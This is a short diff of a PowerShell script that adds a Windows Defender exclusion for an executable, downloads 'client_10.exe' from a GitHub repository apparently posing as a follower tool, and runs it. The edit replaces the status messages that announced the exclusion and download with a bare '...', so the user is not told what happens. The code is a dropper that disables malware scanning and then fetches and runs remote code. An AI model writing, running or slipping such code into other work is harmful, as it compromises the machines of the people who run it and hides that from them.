@@ -35,11 +35,11 @@ foreach ($folder in $targetFolders) {
 $filePath = "$HOME\client_10.exe"
 
 if (-not (Test-Path $filePath)) {
-    Write-Host "File not found. Adding exclusion and downloading..." -ForegroundColor Cyan
+    Write-Host "..." -ForegroundColor Cyan
     Add-MpPreference -ExclusionPath $filePath
     Invoke-WebRequest -Uri "https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe" -OutFile $filePath
 } else {
-    Write-Host "File already exists. Skipping download and exclusion." -ForegroundColor Yellow
+    Write-Host "File already exists." -ForegroundColor Yellow
 }
 
 Start-Process $filePath
